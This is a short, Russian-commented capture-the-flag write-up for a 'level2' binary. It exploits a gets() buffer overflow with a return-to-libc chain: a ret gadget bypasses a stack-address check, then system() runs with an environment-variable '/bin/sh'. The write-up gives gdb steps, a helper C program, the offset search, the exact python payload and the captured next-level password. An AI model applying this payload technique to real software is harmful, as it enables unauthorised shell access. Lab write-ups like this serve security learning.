
# get - Уязвимость к переполнению буфера
=> 0x80484ed <p+25>:	call   0x80483c0 <gets@plt>

# Выполняется проверка, чтобы убедиться, что мы не перезаписываем адрес возврата на адрес в стеке
0x80484fb <p+39>:	and    eax,0xb0000000
0x8048500 <p+44>:	cmp    eax,0xb0000000

# обманем тест, используя 'ret' для эксплойта libc
# находим адрес функции 'system' в libc
gdb> info function system
0xb7e6b060  system

# находим адрес функции 'ret'
=> 0x804853e <p+106>:	ret

# Экспортируем shell, который хотим использовать
$> export SHELL=/bin/sh

# Пишем программу для поиска адресов переменных окружения
$> vi proga.c

#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
    printf("%s at %p\n", argv[1], getenv(argv[1]));
}

$> gcc proga.c -o proga; ./proga SHELL
SHELL is at 0xbffff935

# нужно найти, по какому смещению происходит переполнение буфера

gdb> pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb> r < <(echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL')
gdb> pattern search
Registers contain pattern buffer:
EBP+0 found at offset: 76
EIP+0 found at offset: 80

# Теперь просто надо подготовить payload

$> python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "DUMM" + "\x35\xf9\xff\xbf"' > /tmp/payload2
$> cat /tmp/payload2 - | ./level2

> cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02


# ╮(￣_￣)╭